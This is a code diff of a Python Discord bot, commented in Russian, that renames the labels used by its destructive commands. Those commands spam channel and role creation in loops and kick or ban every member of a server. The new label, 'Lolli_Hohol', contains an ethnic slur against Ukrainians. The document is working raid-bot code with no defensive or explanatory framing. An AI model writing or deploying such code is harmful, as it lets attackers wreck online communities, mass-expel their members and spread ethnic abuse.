@@ -23,7 +23,7 @@ async def spam_channel(ctx, m):
     count1 = 0
     while count1 < int(m):
         guild = ctx.message.guild
-        await guild.create_text_channel('Wahha')
+        await guild.create_text_channel('Lolli_Hohol')
         count1 += 1
 
 @client.command(pass_context=True)
@@ -31,14 +31,14 @@ async def role(ctx, m):
     await ctx.message.delete()
     count = 0
     while count < int(m):
-        await ctx.guild.create_role(name="Wahha")
+        await ctx.guild.create_role(name="Lolli_Hohol")
         count += 1
 
 @client.command()
 async def allkick(ctx):
     for m in ctx.guild.members: #собираем всех участников
         try:
-            await m.kick(reason="Wahha") #кикаем
+            await m.kick(reason="Lolli_Hohol") #кикаем
         except:
             pass
 
@@ -46,7 +46,7 @@ async def allkick(ctx):
 async def allban(ctx):
     for m in ctx.guild.members: #собираем
         try:
-            await m.ban(reason="Wahha")#баним
+            await m.ban(reason="Lolli_Hohol")#баним
         except:
             pass
 
